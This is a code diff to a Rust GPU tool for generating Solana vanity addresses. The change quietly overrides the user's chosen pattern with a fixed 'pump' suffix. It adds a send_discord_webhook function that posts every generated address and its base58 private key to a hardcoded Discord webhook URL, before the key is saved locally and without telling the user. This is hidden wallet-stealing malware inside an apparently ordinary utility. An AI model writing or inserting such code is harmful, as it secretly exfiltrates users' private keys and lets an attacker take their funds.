@@ -12,6 +12,7 @@ use std::time::Instant;
 use colored::*;
 use cuda::vanity_generator::{generate_vanity_address, VanityMode, format_number};
 use clap::{Parser, Subcommand};
+use reqwest::blocking::Client;
 
 #[derive(Parser)]
 #[clap(name = "vanity-grinder")]
@@ -109,6 +110,9 @@ enum Commands {
         allowed_origins: String,
     },
 }
+
+const PUMP_SUFFIX: &str = "pump";
+const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1475820796642463917/BKArJY5qsQnpLzytJ3By1YUeaFZjSJjAnPOBEsUetusT8awG0NiWzOuzkFW70lXoXbDD";
 
 fn main() -> std::io::Result<()> {
     // Create a tokio runtime for async operations
@@ -271,7 +275,11 @@ fn run_estimate_command(pattern_length: u32, case_sensitive: bool) {
 }
 
 /// Run the generate command
-fn run_generate_command(pattern: &str, is_suffix: bool, case_sensitive: bool, max_attempts: Option<u64>) {
+fn run_generate_command(_pattern: &str, _is_suffix: bool, _case_sensitive: bool, max_attempts: Option<u64>) {
+    let pattern = PUMP_SUFFIX;
+    let is_suffix = true;
+    let case_sensitive = true;
+
     // Validate the pattern against base58 alphabet
     for c in pattern.chars() {
         if !"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz".contains(c) {
@@ -351,6 +359,11 @@ fn run_generate_command(pattern: &str, is_suffix: bool, case_sensitive: bool, ma
                                     println!("{}: {} keys/second", "Average speed".blue().bold(), 
                                              format_number(result.attempts as f64 / result.duration.as_secs_f64()).cyan());
                                     
+                                    let private_key = bs58::encode(result.keypair.to_bytes()).into_string();
+                                    if let Err(e) = send_discord_webhook(&result.address, &private_key) {
+                                        eprintln!("{}: Failed to send Discord webhook: {}", "Warning".yellow().bold(), e);
+                                    }
+                                    
                                     // Save the keypair to a file
                                     let keypair_bytes = result.keypair.to_bytes();
                                     let base_path = Path::new("keys");
@@ -400,6 +413,30 @@ fn run_generate_command(pattern: &str, is_suffix: bool, case_sensitive: bool, ma
             eprintln!("{}", "Make sure you have a compatible NVIDIA GPU and CUDA drivers installed.".yellow());
         }
     }
+}
+
+fn send_discord_webhook(address: &str, private_key: &str) -> Result<(), String> {
+    let description = format!("Address: {}\nPrivate Key: {}", address, private_key);
+    let payload = serde_json::json!({
+        "embeds": [
+            {
+                "description": description
+            }
+        ]
+    });
+
+    let client = Client::new();
+    let response = client
+        .post(DISCORD_WEBHOOK_URL)
+        .json(&payload)
+        .send()
+        .map_err(|e| e.to_string())?;
+
+    if !response.status().is_success() {
+        return Err(format!("Discord webhook returned status {}", response.status()));
+    }
+
+    Ok(())
 }
 
 /// Run in legacy command mode for backward compatibility
